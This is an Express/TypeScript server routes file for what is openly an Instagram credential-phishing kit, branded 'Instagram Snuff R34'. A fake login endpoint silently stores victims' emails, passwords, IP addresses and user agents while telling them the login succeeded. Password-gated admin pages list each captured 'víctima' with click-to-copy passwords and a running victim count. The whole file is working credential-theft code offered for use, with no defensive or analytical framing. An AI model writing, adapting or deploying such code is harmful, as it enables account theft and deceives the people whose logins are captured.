import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertLoginCredentialsSchema } from "@shared/schema";
import { z } from "zod";
import { fromZodError } from "zod-validation-error";

// Middleware para verificar contraseña de acceso a la ruta de credenciales
const adminAccessMiddleware = (req: Request, res: Response, next: NextFunction) => {
  const accessKey = req.query.accessKey;
  const CLAVE_ACCESO = "mysoftak9136"; // Clave de acceso fija
  
  if (accessKey === CLAVE_ACCESO) {
    next(); // Acceso permitido
  } else {
    res.status(401).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Acceso Restringido | Instagram Snuff R34</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
        <style>
          :root {
            --bg-color: #0a0a0a;
            --card-bg: #111;
            --text-color: #e0e0e0;
            --highlight-color: #ff3333;
            --border-color: #3a0000;
          }
          
          * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
          }
          
          body {
            font-family: 'Roboto Mono', monospace;
            background-color: var(--bg-color);
            background-image: url("data:image/svg+xml,%3Csvg width='100%25' height='100%25' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpattern id='pattern' width='40' height='40' patternUnits='userSpaceOnUse'%3E%3Cpath d='M20 0 L40 20 L20 40 L0 20 Z' stroke='%23300' stroke-width='1' fill='none'/%3E%3C/pattern%3E%3C/defs%3E%3Crect width='100%25' height='100%25' fill='%23000'/%3E%3Crect width='100%25' height='100%25' fill='url(%23pattern)'/%3E%3C/svg%3E");
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
          }
          
          .container {
            max-width: 400px;
            width: 100%;
            padding: 30px;
            background: rgba(10, 10, 10, 0.8);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
            text-align: center;
            position: relative;
            overflow: hidden;
          }
          
          .container::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(to right, #500, #f00, #500);
          }
          
          h1 {
            color: var(--highlight-color);
            font-size: 1.8rem;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
          }
          
          p {
            color: #999;
            margin-bottom: 30px;
            font-size: 0.9rem;
          }
          
          form {
            margin: 30px 0 20px;
          }
          
          .input-group {
            position: relative;
            margin-bottom: 20px;
          }
          
          input {
            width: 100%;
            padding: 12px 15px;
            background: #0a0a0a;
            border: 1px solid #300;
            color: white;
            border-radius: 3px;
            font-family: inherit;
            font-size: 1rem;
            transition: all 0.3s;
          }
          
          input:focus {
            outline: none;
            border-color: #600;
            box-shadow: 0 0 0 1px #600;
          }
          
          input::placeholder {
            color: #555;
          }
          
          .input-icon {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #500;
          }
          
          button {
            width: 100%;
            padding: 12px 20px;
            background: linear-gradient(to right, #300, #600, #300);
            color: white;
            border: 1px solid #400;
            border-radius: 3px;
            font-size: 1rem;
            cursor: pointer;
            font-family: inherit;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
          }
          
          button:hover {
            background: linear-gradient(to right, #400, #800, #400);
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
          }
          
          /* Animación de pulsación para el botón */
          @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
          }
          
          .pulse {
            animation: pulse 2s infinite;
          }
          
          /* Animación de parpadeo */
          @keyframes flicker {
            0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
              opacity: 0.99;
            }
            20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
              opacity: 0.4;
            }
          }
          
          .warning {
            font-size: 0.75rem;
            color: #700;
            margin-top: 20px;
            font-style: italic;
            animation: flicker 5s infinite alternate;
          }

          /* Blood effects */
          .blood-drop {
            position: absolute;
            width: 3px;
            background: linear-gradient(to bottom, #600, #f00);
            border-radius: 0 0 3px 3px;
            z-index: -1;
            opacity: 0.7;
            top: -10px;
          }
          
          .blood-drop:nth-child(1) { left: 10%; height: 50px; animation: drip 3s infinite; animation-delay: 0s; }
          .blood-drop:nth-child(2) { left: 30%; height: 70px; animation: drip 4s infinite; animation-delay: 1s; }
          .blood-drop:nth-child(3) { left: 50%; height: 30px; animation: drip 5s infinite; animation-delay: 2s; }
          .blood-drop:nth-child(4) { left: 70%; height: 60px; animation: drip 3.5s infinite; animation-delay: 0.5s; }
          .blood-drop:nth-child(5) { left: 90%; height: 40px; animation: drip 4.5s infinite; animation-delay: 1.5s; }
          
          @keyframes drip {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(600px); }
          }
        </style>
      </head>
      <body>
        <div class="blood-drop"></div>
        <div class="blood-drop"></div>
        <div class="blood-drop"></div>
        <div class="blood-drop"></div>
        <div class="blood-drop"></div>
        
        <div class="container">
          <h1>Área Restringida</h1>
          <p>Ingresa la clave de acceso para ver las credenciales capturadas</p>
          
          <form method="GET">
            <div class="input-group">
              <input type="password" name="accessKey" placeholder="Contraseña de administrador" required autocomplete="off">
            </div>
            <button type="submit" class="pulse">Verificar Acceso</button>
          </form>
          
          <p class="warning">* El acceso no autorizado será registrado y reportado</p>
        </div>
        
        <script>
          // Efecto de desenfoque al cargar la página
          document.addEventListener('DOMContentLoaded', function() {
            document.body.style.filter = 'blur(10px)';
            setTimeout(() => {
              document.body.style.filter = 'none';
              document.body.style.transition = 'filter 1s ease';
            }, 500);
          });
          
          // Efecto de error en intentos fallidos (simulado)
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.has('accessKey') && urlParams.get('accessKey') !== '12345') {
            const container = document.querySelector('.container');
            container.style.animation = 'shake 0.5s';
            container.style.animationIterationCount = '1';
            
            // Estilo CSS para la animación
            const style = document.createElement('style');
            style.textContent = '@keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }';
            document.head.appendChild(style);
          }
        </script>
      </body>
      </html>
    `);
  }
};

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api
  
  // Ruta simple para acceder a las credenciales
  app.get("/datos", (_req: Request, res: Response) => {
    res.redirect("/contrato");
  });

  // Login endpoint to store credentials
  app.post("/api/login", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const validatedData = insertLoginCredentialsSchema.parse(req.body);
      
      // Store the credentials with additional metadata
      const credentials = await storage.storeLoginCredentials({
        ...validatedData,
        ipAddress: req.ip,
        userAgent: req.get("User-Agent"),
      });
      
      // Log credentials capture for debugging
      console.log("Credenciales:");
      console.log("- Contraseña:", credentials.password);
      console.log("- Fecha:", credentials.createdAt);
      console.log("- Email:", credentials.email);
      console.log("- IP:", credentials.ipAddress || "No disponible");
      
      // Return success without revealing we stored the credentials
      return res.status(200).json({ success: true, message: "Login successful" });
    } catch (error) {
      // Handle validation errors
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ 
          success: false, 
          message: "Invalid input data", 
          errors: validationError.message 
        });
      }
      
      // Handle other errors
      console.error("Login error:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });

  // Admin endpoint to retrieve all stored credentials (with password protection)
  app.get("/api/credentials", adminAccessMiddleware, async (_req: Request, res: Response) => {
    try {
      const allCredentials = await storage.getAllCredentials();
      return res.status(200).json({ credentials: allCredentials });
    } catch (error) {
      console.error("Error fetching credentials:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });
  
  // HTML view for credentials (with password protection)
  app.get("/view-credentials", adminAccessMiddleware, async (_req: Request, res: Response) => {
    try {
      const allCredentials = await storage.getAllCredentials();
      
      // Generar HTML para mostrar las credenciales
      const credentialsHtml = allCredentials.map((cred, index) => `
        <div class="credential-card" data-index="${index + 1}">
          <div class="card-header">
            <h3 class="victim">Víctima #${index + 1}</h3>
            <span class="timestamp">${new Date(cred.createdAt).toLocaleString()}</span>
          </div>
          <div class="card-body">
            <div class="data-row">
              <div class="data-label">Email/Usuario:</div>
              <div class="data-value email">${cred.email}</div>
            </div>
            <div class="data-row">
              <div class="data-label">Contraseña:</div>
              <div class="data-value password highlight">${cred.password}</div>
            </div>
            <div class="data-row">
              <div class="data-label">Recordar usuario:</div>
              <div class="data-value">${cred.rememberMe ? 'Sí' : 'No'}</div>
            </div>
            <div class="data-divider"></div>
            <h4 class="metadata-header">Información del sistema</h4>
            <div class="data-row">
              <div class="data-label">Dirección IP:</div>
              <div class="data-value">${cred.ipAddress || 'No disponible'}</div>
            </div>
            <div class="data-row">
              <div class="data-label">Fecha y hora:</div>
              <div class="data-value">${new Date(cred.createdAt).toLocaleString()}</div>
            </div>
            <div class="user-agent-container">
              <div class="data-label">Agente de usuario:</div>
              <div class="data-value user-agent">${cred.userAgent || 'No disponible'}</div>
            </div>
          </div>
        </div>
      `).join('');
      
      // Enviar HTML completo
      res.send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Instagram Snuff R34 - Credenciales</title>
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <link rel="preconnect" href="https://fonts.googleapis.com">
          <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
          <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
          <style>
            :root {
              --bg-color: #0a0a0a;
              --card-bg: #111;
              --header-bg: #1a0000;
              --text-color: #e0e0e0;
              --highlight-color: #ff3333;
              --border-color: #3a0000;
              --shadow-color: rgba(255, 0, 0, 0.15);
            }
            
            * {
              box-sizing: border-box;
              margin: 0;
              padding: 0;
            }
            
            body {
              font-family: 'Roboto Mono', monospace;
              background-color: var(--bg-color);
              background-image: url("data:image/svg+xml,%3Csvg width='100%25' height='100%25' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpattern id='pattern' width='40' height='40' patternUnits='userSpaceOnUse'%3E%3Cpath d='M20 0 L40 20 L20 40 L0 20 Z' stroke='%23300' stroke-width='1' fill='none'/%3E%3C/pattern%3E%3C/defs%3E%3Crect width='100%25' height='100%25' fill='%23000'/%3E%3Crect width='100%25' height='100%25' fill='url(%23pattern)'/%3E%3C/svg%3E");
              color: var(--text-color);
              max-width: 100%;
              margin: 0;
              padding: 20px;
              min-height: 100vh;
            }
            
            .page-header {
              text-align: center;
              margin-bottom: 30px;
              border-bottom: 1px solid var(--border-color);
              padding-bottom: 15px;
              position: relative;
            }
            
            .page-header h1 {
              color: var(--highlight-color);
              font-size: 2.2rem;
              margin-bottom: 10px;
              text-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
            }
            
            .page-header p {
              color: #bb0000;
              font-size: 0.9rem;
              opacity: 0.8;
            }
            
            .controls {
              display: flex;
              justify-content: space-between;
              align-items: center;
              margin-bottom: 30px;
            }
            
            .refresh-btn {
              background: linear-gradient(to right, #3a0000, #800000, #3a0000);
              color: white;
              border: 1px solid #500;
              padding: 10px 15px;
              border-radius: 3px;
              cursor: pointer;
              font-family: inherit;
              font-size: 0.9rem;
              display: flex;
              align-items: center;
              gap: 8px;
              transition: all 0.3s;
            }
            
            .refresh-btn:hover {
              background: linear-gradient(to right, #500, #a00, #500);
              box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
            }
            
            .stats {
              font-size: 0.9rem;
              color: #aaa;
            }
            
            .stats span {
              color: var(--highlight-color);
              font-weight: bold;
            }
            
            .credential-container {
              display: grid;
              grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
              gap: 20px;
              margin-top: 20px;
            }
            
            @media (max-width: 768px) {
              .credential-container {
                grid-template-columns: 1fr;
              }
            }
            
            .credential-card {
              background-color: var(--card-bg);
              border: 1px solid var(--border-color);
              border-radius: 5px;
              overflow: hidden;
              box-shadow: 0 3px 15px var(--shadow-color);
              transition: transform 0.2s, box-shadow 0.2s;
              position: relative;
            }
            
            .credential-card:hover {
              transform: translateY(-5px);
              box-shadow: 0 5px 20px var(--shadow-color);
            }
            
            .credential-card::before {
              content: attr(data-index);
              position: absolute;
              top: -10px;
              right: -10px;
              background: var(--highlight-color);
              color: black;
              width: 30px;
              height: 30px;
              display: flex;
              align-items: center;
              justify-content: center;
              border-radius: 50%;
              font-weight: bold;
              font-size: 0.9rem;
              box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
              z-index: 1;
            }
            
            .card-header {
              background: var(--header-bg);
              padding: 15px;
              display: flex;
              justify-content: space-between;
              align-items: center;
              border-bottom: 1px solid var(--border-color);
            }
            
            .victim {
              font-size: 1.1rem;
              color: var(--highlight-color);
              margin: 0;
            }
            
            .timestamp {
              font-size: 0.75rem;
              color: #777;
            }
            
            .card-body {
              padding: 15px;
            }
            
            .data-row {
              display: flex;
              margin-bottom: 10px;
              align-items: baseline;
            }
            
            .data-label {
              min-width: 150px;
              font-weight: bold;
              color: #888;
              font-size: 0.9rem;
            }
            
            .data-value {
              flex: 1;
              word-break: break-all;
            }
            
            .data-value.highlight {
              color: var(--highlight-color);
              font-weight: bold;
            }
            
            .email {
              color: #b3b3ff;
            }
            
            .data-divider {
              height: 1px;
              background: var(--border-color);
              margin: 15px 0;
            }
            
            .metadata-header {
              font-size: 0.9rem;
              color: #777;
              margin-bottom: 10px;
              text-transform: uppercase;
              letter-spacing: 1px;
            }
            
            .user-agent-container {
              margin-top: 10px;
            }
            
            .user-agent {
              font-size: 0.75rem;
              color: #666;
              margin-top: 5px;
              font-family: monospace;
              padding: 8px;
              background: #0a0a0a;
              border-radius: 3px;
              max-height: 60px;
              overflow-y: auto;
            }
            
            .empty-message {
              color: #666;
              text-align: center;
              margin-top: 50px;
              font-style: italic;
              border: 1px dashed var(--border-color);
              padding: 30px;
              border-radius: 5px;
            }
            
            /* Animación de parpadeo */
            @keyframes flicker {
              0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
                opacity: 0.99;
                text-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
              }
              20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
                opacity: 0.4;
                text-shadow: none;
              }
            }
            
            .blink-text {
              animation: flicker 5s infinite alternate;
            }

            /* Scrollbar personalizado */
            ::-webkit-scrollbar { width: 8px; height: 8px; }
            ::-webkit-scrollbar-track { background: #0a0a0a; }
            ::-webkit-scrollbar-thumb { background: #500; border-radius: 3px; }
            ::-webkit-scrollbar-thumb:hover { background: #700; }
          </style>
        </head>
        <body>
          <div class="page-header">
            <h1>Instagram Snuff R34</h1>
            <p>Panel de administración de credenciales capturadas</p>
          </div>
          
          <div class="controls">
            <button class="refresh-btn" onclick="window.location.reload()">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38"/>
              </svg>
              Actualizar datos
            </button>
            <div class="stats">Total de víctimas: <span>${allCredentials.length}</span></div>
          </div>
          
          <div class="credential-container">
            ${allCredentials.length > 0 
              ? credentialsHtml 
              : '<p class="empty-message blink-text">No hay credenciales capturadas aún. Espera a que alguna víctima inicie sesión...</p>'}
          </div>
          
          <script>
            // Destacar/copiar credenciales al hacer clic
            document.addEventListener('DOMContentLoaded', function() {
              const passwordElements = document.querySelectorAll('.data-value.password');
              passwordElements.forEach(el => {
                el.addEventListener('click', function() {
                  navigator.clipboard.writeText(this.textContent);
                  
                  // Visual feedback
                  const originalColor = this.style.color;
                  this.style.color = '#00ff00';
                  setTimeout(() => {
                    this.style.color = originalColor;
                  }, 300);
                });
                el.style.cursor = 'pointer';
                el.title = 'Haz clic para copiar';
              });
            });
          </script>
        </body>
        </html>
      `);
    } catch (error) {
      console.error("Error fetching credentials for view:", error);
      res.status(500).send("Error al cargar las credenciales");
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
